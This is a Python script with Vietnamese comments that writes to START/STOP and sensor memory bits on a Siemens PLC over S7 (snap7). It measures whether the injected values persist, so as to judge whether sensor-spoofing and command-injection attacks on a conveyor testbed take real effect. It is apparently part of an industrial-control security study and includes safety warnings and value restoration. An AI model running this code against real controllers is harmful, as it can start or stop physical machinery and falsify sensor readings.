"""
PROBE_BIT_STICKRATE — do ty le "dinh" khi ghi tu ngoai vao 1 BIT Merker.

Bo tro cho probe_setpoint_stickrate.py (do bien DINT nhu CD1/timer). Script nay
do cac BIT: bit lenh (M5.0 START / M5.1 STOP) va bit cam bien (M5.4 Vat_1 /
M5.6 Vat_2 / M6.0 Vat_3). Muc dich: xac dinh THUC NGHIEM tag nao PLC "so huu"
(tu tinh moi scan -> ghi tu ngoai bi xoa) va tag nao PLC doc nhu INPUT (ghi tu
ngoai DINH -> tan cong integrity co tac dong that).

Ket qua CD1/MD54 = 0.2% (timer ET, PLC tu tinh). Script nay tra loi cau con lai:
  - Neu bit cam bien (Vat_x) DINH ~100% -> SENSOR_SPOOF co tac dong that.
  - Neu Vat_x cung ~0% -> PLC ghi de tu cam bien vat ly moi scan (giong BangTai),
    can dieu chinh claim SENSOR_SPOOF y het da lam voi SETPOINT.
Khong doan truoc -- DO roi ket luan.

*** CANH BAO AN TOAN ***
Ghi M5.0/M5.1 (START/STOP) DIEU KHIEN BANG TAI THAT -> bang se chay/dung that
trong luc do. Mac dinh script nham vao BIT CAM BIEN (M5.4 Vat_1) it pha hoai hon.
Moi trial chi lat bit trong `--window` giay roi KHOI PHUC ngay. Luon restore gia
tri goc trong finally. Chi test START/STOP khi ban chu dong va testbed an toan.

KHONG lien quan dataset Day1-7: khong thu pcap, khong train lai.

Goi (mac dinh test Vat_1 = M5.4):
  python probe_bit_stickrate.py --target 192.168.210.211 --rack 0 --slot 1 \
      --byte 5 --bit 4 --trials 10 --window 0.5 --out scratch/stickrate_vat1.json

Test bit lenh STOP (M5.1) -- CAN THAN, bang tai se dung that:
  python probe_bit_stickrate.py --byte 5 --bit 1 --name STOP \
      --out scratch/stickrate_stop.json
"""

import argparse
import json
import sys
import time
from pathlib import Path

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool


def read_bit(client, byte_off: int, bit_off: int) -> bool:
    return get_bool(client.read_area(Areas.MK, 0, byte_off, 1), 0, bit_off)


def write_bit(client, byte_off: int, bit_off: int, value: bool) -> None:
    """Doc-sua-ghi ca byte de khong dap cac bit khac trong cung byte."""
    buf = client.read_area(Areas.MK, 0, byte_off, 1)
    set_bool(buf, 0, bit_off, bool(value))
    client.write_area(Areas.MK, 0, byte_off, buf)


def run(args) -> int:
    client = snap7.client.Client()
    try:
        print(f"[*] Connect PLC {args.target} rack={args.rack} slot={args.slot}")
        client.connect(args.target, args.rack, args.slot)
    except Exception as exc:
        print(f"[!] Khong ket noi duoc PLC: {exc}")
        return 2

    tag = args.name or f"M{args.byte}.{args.bit}"
    original = None
    try:
        try:
            print(f"[*] CPU state: {client.get_cpu_state()}")
        except Exception:
            pass

        original = read_bit(client, args.byte, args.bit)
        inject = not original
        print(f"[*] Tag {tag} (M{args.byte}.{args.bit}) goc = {original} -> se ghi {inject}")
        if args.byte == 5 and args.bit in (0, 1):
            print("[!] CANH BAO: day la bit lenh START/STOP -- bang tai se dong/mo THAT.")

        sample_interval = 1.0 / args.sample_hz
        persisted_total = 0
        reverted_total = 0
        per_trial = []
        first_trajectory = None

        print(f"\n[*] {args.trials} trial: ghi {inject} roi doc lai {args.sample_hz}Hz "
              f"trong {args.window}s, roi khoi phuc {original}...\n")

        for t in range(1, args.trials + 1):
            write_bit(client, args.byte, args.bit, inject)
            tp = tr = 0
            traj = []
            t_end = time.time() + args.window
            while time.time() < t_end:
                try:
                    v = read_bit(client, args.byte, args.bit)
                    traj.append(int(v))
                    if v == inject:
                        tp += 1
                    else:
                        tr += 1
                except Exception as e:
                    print(f"  [trial {t}] read error: {e}")
                time.sleep(sample_interval)
            # khoi phuc ngay sau moi trial de gioi han thoi gian pha hoai
            write_bit(client, args.byte, args.bit, original)

            persisted_total += tp
            reverted_total += tr
            n = tp + tr
            rate = (tp / n * 100) if n else 0.0
            per_trial.append({"trial": t, "persisted": tp, "reverted": tr,
                              "stick_pct": round(rate, 1)})
            print(f"  [trial {t:2d}] dinh={tp:3d} bat_lai={tr:3d} stick={rate:5.1f}%")
            if first_trajectory is None:
                first_trajectory = traj
            time.sleep(0.2)

        total = persisted_total + reverted_total
        overall = (persisted_total / total * 100) if total else 0.0

        print("\n" + "=" * 60)
        print(f"KET QUA {tag}")
        print(f"  Tong lan doc lai      : {total}")
        print(f"  Gia tri gia GIU DUOC  : {persisted_total}")
        print(f"  Gia tri gia BI GHI DE : {reverted_total}")
        print(f"  >>> STICK-RATE        : {overall:.1f}%")
        print("=" * 60)
        print("So sanh (cung phep do readback):")
        print(f"  {tag:22s}: {overall:.1f}%")
        print(f"  CD1/MD54 (timer ET)   : 0.2%")
        print(f"  BangTai (output coil) : 17.8%")
        print(f"  nhap (PLC nap)        : 0.0%")
        print("=" * 60)
        if overall > 80:
            print(">> DINH cao -> PLC doc tag nay nhu INPUT: ghi tu ngoai co tac dong that.")
        elif overall < 20:
            print(">> KHONG dinh -> PLC tu tinh/ghi de tag nay moi scan: ghi tu ngoai vo hieu.")
        else:
            print(">> Dinh mot phan -> dua thoi gian voi chu ky scan (giong BangTai).")

        if args.out:
            out = {
                "target": args.target, "tag": tag,
                "byte": args.byte, "bit": args.bit,
                "original_value": original, "injected_value": inject,
                "trials": args.trials, "sample_hz": args.sample_hz, "window_s": args.window,
                "persisted_total": persisted_total, "reverted_total": reverted_total,
                "stick_rate_pct": round(overall, 2),
                "per_trial": per_trial, "first_trial_trajectory": first_trajectory,
                "comparison": {tag: round(overall, 2), "CD1_md54_timer": 0.2,
                               "BangTai_output_coil": 17.8, "nhap_plc_loaded": 0.0},
            }
            Path(args.out).parent.mkdir(parents=True, exist_ok=True)
            Path(args.out).write_text(json.dumps(out, indent=2, ensure_ascii=False),
                                      encoding="utf-8")
            print(f"[*] Da ghi ket qua -> {args.out}")
        return 0

    except Exception as exc:
        print(f"[!] Loi: {exc}")
        return 1
    finally:
        if original is not None and client.get_connected():
            try:
                write_bit(client, args.byte, args.bit, original)
                print(f"[*] Da khoi phuc {tag} = {original}")
            except Exception as e:
                print(f"[!] Khoi phuc that bai, kiem tra thu cong {tag}: {e}")
        if client.get_connected():
            client.disconnect()


def main() -> int:
    p = argparse.ArgumentParser(
        description="Do stick-rate khi ghi tu ngoai vao 1 bit Merker (lenh/cam bien).")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    p.add_argument("--byte", type=int, default=5, help="Byte Merker (mac dinh 5)")
    p.add_argument("--bit", type=int, default=4,
                   help="Bit trong byte (mac dinh 4 = Vat_1). 0=START 1=STOP 4=Vat_1 6=Vat_2")
    p.add_argument("--name", default=None, help="Ten tag de in cho de doc (vd Vat_1, STOP)")
    p.add_argument("--trials", type=int, default=10)
    p.add_argument("--sample-hz", type=float, default=20.0)
    p.add_argument("--window", type=float, default=0.5,
                   help="Cua so doc lai moi trial, giay (mac dinh 0.5 -- ngan de it pha hoai)")
    p.add_argument("--out", default="scratch/stickrate_bit.json")
    return run(p.parse_args())


if __name__ == "__main__":
    sys.exit(main())
